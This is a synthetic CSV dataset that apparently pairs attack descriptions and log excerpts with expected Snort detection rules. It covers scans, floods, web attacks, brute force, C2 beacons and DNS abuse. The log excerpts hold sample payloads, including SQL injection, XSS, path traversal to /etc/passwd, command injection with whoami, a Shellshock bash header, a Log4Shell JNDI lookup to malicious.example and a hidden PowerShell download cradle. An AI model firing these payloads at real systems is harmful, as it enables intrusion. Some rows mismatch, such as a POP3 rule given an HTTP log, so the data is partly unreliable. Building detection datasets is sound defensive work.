doc_id,attack_description,description_style,attack_family,attack_type,protocol,source_zone,destination_zone,source_port,destination_port,service,payload_pattern,log_excerpt,expected_snort_rule,rule_explanation,severity,false_positive_risk,mitre_technique,keywords,synthetic_generation_method,needs_retrieval
SNORT_0069,"As a security analyst, I want to detect this behavior: Identify a possible port scan where one source sends many SYN packets to SSH on port 22.",analyst_request,Reconnaissance,TCP SYN Port Scan,tcp,$EXTERNAL_NET,$HOME_NET,any,22,SSH,many connection attempts,IDS flow: repeated SYN packets from 198.51.100.183 to 10.0.2.217:22 in 10 seconds,"alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:""Possible TCP SYN scan against SSH""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000069; rev:1;)","This Snort rule is designed for TCP SYN Port Scan in the Reconnaissance family. It monitors TCP traffic on destination port 22 (SSH) and uses indicators such as many connection attempts. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1046 Network Service Discovery,"scan, syn, port, reconnaissance, nmap",manual template + controlled random variations,True
SNORT_0070,Detect an ICMP ping sweep where one source probes many internal hosts.,formal,Reconnaissance,ICMP Ping Sweep,icmp,$EXTERNAL_NET,$HOME_NET,any,any,generic network,ping sweep,Firewall log: ICMP echo requests to multiple hosts from 198.51.100.55,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000070; rev:1;)","This Snort rule is designed for ICMP Ping Sweep in the Reconnaissance family. It monitors ICMP traffic on destination port any (generic network) and uses indicators such as ping sweep. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",low,medium,T1018 Remote System Discovery,"icmp, ping, sweep, reconnaissance, echo",manual template + controlled random variations,True
SNORT_0071,"As a security analyst, I want to detect this behavior: Detect a TCP SYN flood targeting the HTTP service on port 80.",analyst_request,DoS_DDoS,TCP SYN Flood,tcp,$EXTERNAL_NET,$HOME_NET,any,80,HTTP,high syn rate,Netflow anomaly: high half-open TCP SYN rate to 10.0.2.188:80,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN flood against HTTP""; flags:S; detection_filter:track by_dst, count 200, seconds 5; classtype:attempted-dos; sid:1000071; rev:1;)","This Snort rule is designed for TCP SYN Flood in the DoS_DDoS family. It monitors TCP traffic on destination port 80 (HTTP) and uses indicators such as high syn rate. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1498 Network Denial of Service,"syn flood, dos, ddos, tcp, web",manual template + controlled random variations,True
SNORT_0072,"As a security analyst, I want to detect this behavior: Identify possible UDP denial-of-service traffic on port 500.",analyst_request,DoS_DDoS,UDP Flood,udp,$EXTERNAL_NET,$HOME_NET,any,500,IKE,many sources,src=multiple dst=10.0.3.232 proto=UDP dpt=500 count=1250 bytes=large,"alert udp $EXTERNAL_NET any -> $HOME_NET 500 (msg:""Possible UDP flood on IKE""; detection_filter:track by_dst, count 300, seconds 10; classtype:attempted-dos; sid:1000072; rev:1;)","This Snort rule is designed for UDP Flood in the DoS_DDoS family. It monitors UDP traffic on destination port 500 (IKE) and uses indicators such as many sources. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1498 Network Denial of Service,"udp, flood, dos, amplification",manual template + controlled random variations,True
SNORT_0073,Generate a Snort rule for a web request containing SQL injection keywords.,formal,Web_Attack,SQL Injection,tcp,$EXTERNAL_NET,$HOME_NET,any,80,HTTP,sqlmap,HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.10,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000073; rev:1;)","This Snort rule is designed for SQL Injection in the Web_Attack family. It monitors TCP traffic on destination port 80 (HTTP) and uses indicators such as sqlmap. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,low,T1190 Exploit Public-Facing Application,"sql injection, sqli, union, select, web",manual template + controlled random variations,True
SNORT_0074,Need IDS detection logic for Cross Site Scripting: Identify cross-site scripting attempts against the HTTP-alt application. Include protocol and threshold constraints.,technical,Web_Attack,Cross Site Scripting,tcp,$EXTERNAL_NET,$HOME_NET,any,8080,HTTP-alt,onerror=,HTTP request uri=/comment?msg=%3Cscript%3Ealert(1)%3C/script%3E src=198.51.100.120,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible reflected XSS script tag""; flow:to_server,established; content:""<script""; nocase; http_uri; classtype:web-application-attack; sid:1000074; rev:1;)","This Snort rule is designed for Cross Site Scripting in the Web_Attack family. It monitors TCP traffic on destination port 8080 (HTTP-alt) and uses indicators such as onerror=. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1189 Drive-by Compromise,"xss, script, javascript, web",manual template + controlled random variations,True
SNORT_0075,Rule for directory traversal on the network.,short,Web_Attack,Directory Traversal,tcp,$EXTERNAL_NET,$HOME_NET,any,443,HTTPS,..%2f,GET /download?file=../../../../etc/passwd HTTP/1.1 host=app.local,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible directory traversal attempt""; flow:to_server,established; content:""../""; http_uri; classtype:web-application-attack; sid:1000075; rev:1;)","This Snort rule is designed for Directory Traversal in the Web_Attack family. It monitors TCP traffic on destination port 443 (HTTPS) and uses indicators such as ..%2f. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,low,T1190 Exploit Public-Facing Application,"directory traversal, path traversal, etc passwd, web",manual template + controlled random variations,True
SNORT_0076,SOC ticket: suspicious Web_Attack activity observed. Create a Snort rule for web requests containing whoami or id after command separators.,incident_ticket,Web_Attack,Command Injection,tcp,$EXTERNAL_NET,$HOME_NET,any,8080,HTTP-alt,|whoami,POST /tools/check body=ip=8.8.8.8|id from 203.0.113.113,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible HTTP command injection""; flow:to_server,established; pcre:""/(;|\||&&)(whoami|id|cat)/Ui""; classtype:web-application-attack; sid:1000076; rev:1;)","This Snort rule is designed for Command Injection in the Web_Attack family. It monitors TCP traffic on destination port 8080 (HTTP-alt) and uses indicators such as |whoami. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,medium,T1059 Command and Scripting Interpreter,"command injection, whoami, cat, shell, web",manual template + controlled random variations,True
SNORT_0077,SOC ticket: suspicious Brute_Force activity observed. Detect repeated SSH connection attempts that may indicate brute force.,incident_ticket,Brute_Force,SSH Brute Force,tcp,$EXTERNAL_NET,$HOME_NET,any,22,SSH,many failed ssh logins,tcp flow src=198.51.100.183 dst=10.0.5.193:22 sessions=25 in 60s,"alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:""Possible SSH brute force attempts""; flow:to_server,established; detection_filter:track by_src, count 15, seconds 60; classtype:attempted-recon; sid:1000077; rev:1;)","This Snort rule is designed for SSH Brute Force in the Brute_Force family. It monitors TCP traffic on destination port 22 (SSH) and uses indicators such as many failed ssh logins. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1110 Brute Force,"ssh, brute force, login, authentication",manual template + controlled random variations,True
SNORT_0078,"As a security analyst, I want to detect this behavior: Create a rule for many FTP login attempts on port 21.",analyst_request,Brute_Force,FTP Brute Force,tcp,$EXTERNAL_NET,$HOME_NET,any,21,FTP,USER,ftp auth failed user=admin src=203.0.113.87 dst=10.0.5.75 attempts=31,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible FTP brute force USER attempts""; flow:to_server,established; content:""USER""; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1000078; rev:1;)","This Snort rule is designed for FTP Brute Force in the Brute_Force family. It monitors TCP traffic on destination port 21 (FTP) and uses indicators such as USER. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1110 Brute Force,"ftp, brute force, user, pass",manual template + controlled random variations,True
SNORT_0079,"As a security analyst, I want to detect this behavior: Identify repeated outbound HTTP requests that look like command-and-control.",analyst_request,Malware_C2,HTTP C2 Beacon,tcp,$HOME_NET,$EXTERNAL_NET,any,443,HTTPS,periodic,Proxy log: repeated small HTTP requests with fixed interval from host 10.0.6.115,"alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000079; rev:1;)","This Snort rule is designed for HTTP C2 Beacon in the Malware_C2 family. It monitors TCP traffic on destination port 443 (HTTPS) and uses indicators such as periodic. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,medium,T1071.001 Web Protocols,"c2, beacon, malware, http, periodic",manual template + controlled random variations,True
SNORT_0080,SOC ticket: suspicious Malware_C2 activity observed. Identify malware staging using powershell and DownloadString keywords.,incident_ticket,Malware_C2,PowerShell Download Cradle,tcp,$HOME_NET,$EXTERNAL_NET,any,80,HTTP,DownloadString,POST /cmd body=powershell -nop -w hidden IEX(New-Object Net.WebClient).DownloadString(...) src=10.0.7.23,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""Possible PowerShell download cradle""; flow:to_server,established; content:""powershell""; nocase; content:""DownloadString""; nocase; classtype:trojan-activity; sid:1000080; rev:1;)","This Snort rule is designed for PowerShell Download Cradle in the Malware_C2 family. It monitors TCP traffic on destination port 80 (HTTP) and uses indicators such as DownloadString. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,low,T1059.001 PowerShell,"powershell, download, malware, payload, c2",manual template + controlled random variations,True
SNORT_0081,Need IDS detection logic for DNS Tunneling: Detect repeated DNS TXT queries with long encoded-looking subdomains. Include protocol and threshold constraints.,technical,DNS_Attack,DNS Tunneling,udp,$HOME_NET,$EXTERNAL_NET,any,53,DNS,long domain,Resolver log: many long subdomain TXT queries from host 10.0.8.208,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000081; rev:1;)","This Snort rule is designed for DNS Tunneling in the DNS_Attack family. It monitors UDP traffic on destination port 53 (DNS) and uses indicators such as long domain. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1071.004 DNS,"dns, tunneling, long subdomain, txt, exfiltration",manual template + controlled random variations,True
SNORT_0082,Detect many DNS ANY queries that may be used for amplification.,formal,DNS_Attack,DNS Amplification,udp,$HOME_NET,$EXTERNAL_NET,any,53,DNS,ANY query,DNS query type=ANY domain=example.org src=203.0.113.131 count=89,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000082; rev:1;)","This Snort rule is designed for DNS Amplification in the DNS_Attack family. It monitors UDP traffic on destination port 53 (DNS) and uses indicators such as ANY query. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1498 Network Denial of Service,"dns, amplification, any, dos",manual template + controlled random variations,True
SNORT_0083,"As a security analyst, I want to detect this behavior: Generate a Snort rule for HTTP payloads with ${jndi: patterns.",analyst_request,Exploitation,Log4Shell JNDI Pattern,tcp,$EXTERNAL_NET,$HOME_NET,any,8443,HTTPS-alt,ldap://,GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8443 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000083; rev:1;)","This Snort rule is designed for Log4Shell JNDI Pattern in the Exploitation family. It monitors TCP traffic on destination port 8443 (HTTPS-alt) and uses indicators such as ldap://. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,low,T1190 Exploit Public-Facing Application,"log4j, jndi, ldap, exploit, web",manual template + controlled random variations,True
SNORT_0084,Need IDS detection logic for Shellshock CGI Pattern: Create a Snort rule for CGI Bash function injection patterns. Include protocol and threshold constraints.,technical,Exploitation,Shellshock CGI Pattern,tcp,$EXTERNAL_NET,$HOME_NET,any,443,HTTPS,() {,User-Agent: () { :;}; /bin/bash -c 'id' src=198.51.100.177,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000084; rev:1;)","This Snort rule is designed for Shellshock CGI Pattern in the Exploitation family. It monitors TCP traffic on destination port 443 (HTTPS) and uses indicators such as () {. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,low,T1190 Exploit Public-Facing Application,"shellshock, cgi, bash, exploit, web",manual template + controlled random variations,True
SNORT_0085,Need IDS detection logic for Cleartext Password Exposure: Generate a policy rule for credentials sent over cleartext protocol HTTP. Include protocol and threshold constraints.,technical,Policy_Violation,Cleartext Password Exposure,tcp,$HOME_NET,$EXTERNAL_NET,any,80,HTTP,pwd=,POST /login body=username=alice&password=Summer2026 src=10.0.9.247,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""Possible cleartext password exposure""; flow:to_server,established; pcre:""/(password=|pwd=|PASS\s+)/Ui""; classtype:policy-violation; sid:1000085; rev:1;)","This Snort rule is designed for Cleartext Password Exposure in the Policy_Violation family. It monitors TCP traffic on destination port 80 (HTTP) and uses indicators such as pwd=. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1552 Unsecured Credentials,"cleartext, password, credentials, policy",manual template + controlled random variations,True
SNORT_0086,Identify a possible port scan where one source sends many SYN packets to SMTP on port 25.,formal,Reconnaissance,TCP SYN Port Scan,tcp,$EXTERNAL_NET,$HOME_NET,any,25,SMTP,SYN probe,src=203.0.113.227 dst=10.0.1.33 proto=TCP dpt=25 flags=S count=34 window=1024,"alert tcp $EXTERNAL_NET any -> $HOME_NET 25 (msg:""Possible TCP SYN scan against SMTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000086; rev:1;)","This Snort rule is designed for TCP SYN Port Scan in the Reconnaissance family. It monitors TCP traffic on destination port 25 (SMTP) and uses indicators such as SYN probe. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1046 Network Service Discovery,"scan, syn, port, reconnaissance, nmap",manual template + controlled random variations,True
SNORT_0087,"As a security analyst, I want to detect this behavior: Create a rule for excessive ICMP echo requests from the same external IP.",analyst_request,Reconnaissance,ICMP Ping Sweep,icmp,$EXTERNAL_NET,$HOME_NET,any,any,generic network,ping sweep,Firewall log: ICMP echo requests to multiple hosts from 198.51.100.203,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000087; rev:1;)","This Snort rule is designed for ICMP Ping Sweep in the Reconnaissance family. It monitors ICMP traffic on destination port any (generic network) and uses indicators such as ping sweep. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",low,medium,T1018 Remote System Discovery,"icmp, ping, sweep, reconnaissance, echo",manual template + controlled random variations,True
SNORT_0088,"As a security analyst, I want to detect this behavior: Identify denial-of-service behavior with many SYN packets to port 8080.",analyst_request,DoS_DDoS,TCP SYN Flood,tcp,$EXTERNAL_NET,$HOME_NET,any,8080,HTTP-alt,half-open,Netflow anomaly: high half-open TCP SYN rate to 10.0.2.234:8080,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible TCP SYN flood against HTTP-alt""; flags:S; detection_filter:track by_dst, count 200, seconds 5; classtype:attempted-dos; sid:1000088; rev:1;)","This Snort rule is designed for TCP SYN Flood in the DoS_DDoS family. It monitors TCP traffic on destination port 8080 (HTTP-alt) and uses indicators such as half-open. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1498 Network Denial of Service,"syn flood, dos, ddos, tcp, web",manual template + controlled random variations,True
SNORT_0089,SOC ticket: suspicious DoS_DDoS activity observed. Detect a UDP flood targeting port 500 on an internal server.,incident_ticket,DoS_DDoS,UDP Flood,udp,$EXTERNAL_NET,$HOME_NET,any,500,IKE,high udp rate,Collector: UDP packets to 10.0.4.194:500 exceed baseline by 800%,"alert udp $EXTERNAL_NET any -> $HOME_NET 500 (msg:""Possible UDP flood on IKE""; detection_filter:track by_dst, count 300, seconds 10; classtype:attempted-dos; sid:1000089; rev:1;)","This Snort rule is designed for UDP Flood in the DoS_DDoS family. It monitors UDP traffic on destination port 500 (IKE) and uses indicators such as high udp rate. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1498 Network Denial of Service,"udp, flood, dos, amplification",manual template + controlled random variations,True
SNORT_0090,"As a security analyst, I want to detect this behavior: Generate a Snort rule for a web request containing SQL injection keywords.",analyst_request,Web_Attack,SQL Injection,tcp,$EXTERNAL_NET,$HOME_NET,any,8080,HTTP-alt,UNION SELECT,HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.170,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000090; rev:1;)","This Snort rule is designed for SQL Injection in the Web_Attack family. It monitors TCP traffic on destination port 8080 (HTTP-alt) and uses indicators such as UNION SELECT. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,low,T1190 Exploit Public-Facing Application,"sql injection, sqli, union, select, web",manual template + controlled random variations,True
SNORT_0091,Rule for cross site scripting on the network.,short,Web_Attack,Cross Site Scripting,tcp,$EXTERNAL_NET,$HOME_NET,any,443,HTTPS,javascript:,GET /search?q=<script>alert(1)</script> HTTP/1.1 host=portal.local,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible reflected XSS script tag""; flow:to_server,established; content:""<script""; nocase; http_uri; classtype:web-application-attack; sid:1000091; rev:1;)","This Snort rule is designed for Cross Site Scripting in the Web_Attack family. It monitors TCP traffic on destination port 443 (HTTPS) and uses indicators such as javascript:. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1189 Drive-by Compromise,"xss, script, javascript, web",manual template + controlled random variations,True
SNORT_0092,Need IDS detection logic for Directory Traversal: Detect directory traversal attempts using ../ sequences in HTTP URI. Include protocol and threshold constraints.,technical,Web_Attack,Directory Traversal,tcp,$EXTERNAL_NET,$HOME_NET,any,8080,HTTP-alt,/etc/passwd,GET /download?file=../../../../etc/passwd HTTP/1.1 host=app.local,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible directory traversal attempt""; flow:to_server,established; content:""../""; http_uri; classtype:web-application-attack; sid:1000092; rev:1;)","This Snort rule is designed for Directory Traversal in the Web_Attack family. It monitors TCP traffic on destination port 8080 (HTTP-alt) and uses indicators such as /etc/passwd. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,low,T1190 Exploit Public-Facing Application,"directory traversal, path traversal, etc passwd, web",manual template + controlled random variations,True
SNORT_0093,Need IDS detection logic for Command Injection: Identify HTTP command injection payloads against HTTP. Include protocol and threshold constraints.,technical,Web_Attack,Command Injection,tcp,$EXTERNAL_NET,$HOME_NET,any,80,HTTP,|whoami,GET /ping?host=127.0.0.1;whoami HTTP/1.1 src=198.51.100.116,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible HTTP command injection""; flow:to_server,established; pcre:""/(;|\||&&)(whoami|id|cat)/Ui""; classtype:web-application-attack; sid:1000093; rev:1;)","This Snort rule is designed for Command Injection in the Web_Attack family. It monitors TCP traffic on destination port 80 (HTTP) and uses indicators such as |whoami. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,medium,T1059 Command and Scripting Interpreter,"command injection, whoami, cat, shell, web",manual template + controlled random variations,True
SNORT_0094,Generate a rule for excessive SSH login attempts from the same source.,formal,Brute_Force,SSH Brute Force,tcp,$EXTERNAL_NET,$HOME_NET,any,22,SSH,auth failure,sshd: Failed password for invalid user admin from 203.0.113.223 port 51422 repeated=18,"alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:""Possible SSH brute force attempts""; flow:to_server,established; detection_filter:track by_src, count 15, seconds 60; classtype:attempted-recon; sid:1000094; rev:1;)","This Snort rule is designed for SSH Brute Force in the Brute_Force family. It monitors TCP traffic on destination port 22 (SSH) and uses indicators such as auth failure. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1110 Brute Force,"ssh, brute force, login, authentication",manual template + controlled random variations,True
SNORT_0095,SOC ticket: suspicious Brute_Force activity observed. Identify FTP authentication guessing from one external source.,incident_ticket,Brute_Force,FTP Brute Force,tcp,$EXTERNAL_NET,$HOME_NET,any,21,FTP,PASS,FTP control channel contains repeated USER commands from 198.51.100.11,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible FTP brute force USER attempts""; flow:to_server,established; content:""USER""; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1000095; rev:1;)","This Snort rule is designed for FTP Brute Force in the Brute_Force family. It monitors TCP traffic on destination port 21 (FTP) and uses indicators such as PASS. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1110 Brute Force,"ftp, brute force, user, pass",manual template + controlled random variations,True
SNORT_0096,SOC ticket: suspicious Malware_C2 activity observed. Generate a rule for possible malware C2 HTTP beacon traffic.,incident_ticket,Malware_C2,HTTP C2 Beacon,tcp,$HOME_NET,$EXTERNAL_NET,any,443,HTTPS,periodic,HTTP GET /gate.php every=60s user-agent=Mozilla/4.0 src=10.0.6.58 dst=198.51.100.134,"alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000096; rev:1;)","This Snort rule is designed for HTTP C2 Beacon in the Malware_C2 family. It monitors TCP traffic on destination port 443 (HTTPS) and uses indicators such as periodic. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,medium,T1071.001 Web Protocols,"c2, beacon, malware, http, periodic",manual template + controlled random variations,True
SNORT_0097,Create a rule for suspicious PowerShell download cradle content.,formal,Malware_C2,PowerShell Download Cradle,tcp,$HOME_NET,$EXTERNAL_NET,any,443,HTTPS,Invoke-Expression,HTTP payload contains powershell DownloadString from 10.0.7.173 to 203.0.113.96,"alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:""Possible PowerShell download cradle""; flow:to_server,established; content:""powershell""; nocase; content:""DownloadString""; nocase; classtype:trojan-activity; sid:1000097; rev:1;)","This Snort rule is designed for PowerShell Download Cradle in the Malware_C2 family. It monitors TCP traffic on destination port 443 (HTTPS) and uses indicators such as Invoke-Expression. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,low,T1059.001 PowerShell,"powershell, download, malware, payload, c2",manual template + controlled random variations,True
SNORT_0098,Need IDS detection logic for DNS Tunneling: Identify DNS exfiltration behavior using many TXT requests. Include protocol and threshold constraints.,technical,DNS_Attack,DNS Tunneling,udp,$HOME_NET,$EXTERNAL_NET,any,53,DNS,base64-like,Resolver log: many long subdomain TXT queries from host 10.0.8.161,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000098; rev:1;)","This Snort rule is designed for DNS Tunneling in the DNS_Attack family. It monitors UDP traffic on destination port 53 (DNS) and uses indicators such as base64-like. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1071.004 DNS,"dns, tunneling, long subdomain, txt, exfiltration",manual template + controlled random variations,True
SNORT_0099,"As a security analyst, I want to detect this behavior: Create a rule for DNS amplification attempts using query type ANY.",analyst_request,DNS_Attack,DNS Amplification,udp,$HOME_NET,$EXTERNAL_NET,any,53,DNS,large response,DNS query type=ANY domain=example.org src=203.0.113.31 count=89,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000099; rev:1;)","This Snort rule is designed for DNS Amplification in the DNS_Attack family. It monitors UDP traffic on destination port 53 (DNS) and uses indicators such as large response. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",high,medium,T1498 Network Denial of Service,"dns, amplification, any, dos",manual template + controlled random variations,True
SNORT_0100,Need IDS detection logic for Log4Shell JNDI Pattern: Generate a Snort rule for HTTP payloads with ${jndi: patterns. Include protocol and threshold constraints.,technical,Exploitation,Log4Shell JNDI Pattern,tcp,$EXTERNAL_NET,$HOME_NET,any,443,HTTPS,ldap://,GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000100; rev:1;)","This Snort rule is designed for Log4Shell JNDI Pattern in the Exploitation family. It monitors TCP traffic on destination port 443 (HTTPS) and uses indicators such as ldap://. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,low,T1190 Exploit Public-Facing Application,"log4j, jndi, ldap, exploit, web",manual template + controlled random variations,True
SNORT_0101,Rule for shellshock cgi pattern on the network.,short,Exploitation,Shellshock CGI Pattern,tcp,$EXTERNAL_NET,$HOME_NET,any,80,HTTP,:;};,HTTP header contains Bash function pattern targeting /cgi-bin/status,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000101; rev:1;)","This Snort rule is designed for Shellshock CGI Pattern in the Exploitation family. It monitors TCP traffic on destination port 80 (HTTP) and uses indicators such as :;};. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",critical,low,T1190 Exploit Public-Facing Application,"shellshock, cgi, bash, exploit, web",manual template + controlled random variations,True
SNORT_0102,Rule for cleartext password exposure on the network.,short,Policy_Violation,Cleartext Password Exposure,tcp,$HOME_NET,$EXTERNAL_NET,any,110,POP3,pwd=,POST /login body=username=alice&password=Summer2026 src=10.0.9.6,"alert tcp $HOME_NET any -> $EXTERNAL_NET 110 (msg:""Possible cleartext password exposure""; flow:to_server,established; pcre:""/(password=|pwd=|PASS\s+)/Ui""; classtype:policy-violation; sid:1000102; rev:1;)","This Snort rule is designed for Cleartext Password Exposure in the Policy_Violation family. It monitors TCP traffic on destination port 110 (POP3) and uses indicators such as pwd=. The detection options help reduce false positives by using flow, content, flags, or threshold constraints when applicable.",medium,medium,T1552 Unsecured Credentials,"cleartext, password, credentials, policy",manual template + controlled random variations,True
